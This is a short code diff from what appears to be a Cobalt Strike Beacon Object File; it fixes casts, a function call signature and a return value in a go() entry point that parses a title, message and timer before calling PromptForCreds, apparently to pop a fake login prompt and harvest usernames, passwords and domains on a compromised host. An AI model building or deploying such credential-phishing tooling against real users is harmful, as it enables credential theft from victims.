@@ -240,11 +240,10 @@ int go(char *args, int len) {
 	datap parser;
 	
 	BeaconDataParse(&parser, args, len);
-	title = BeaconDataExtract(&parser, NULL);
-	message = BeaconDataExtract(&parser, NULL);
-	timer_seconds = BeaconDataInt(&parser, NULL);
-	if(!bofstart()) return;
-	
+	title = (LPWSTR)BeaconDataExtract(&parser, NULL);
+	message = (LPWSTR)BeaconDataExtract(&parser, NULL);
+	timer_seconds = BeaconDataInt(&parser);
+	if(!bofstart()) return 0;
 	
     if (PromptForCreds(title, message, &username, &password, &domain, timer_seconds))
 	{
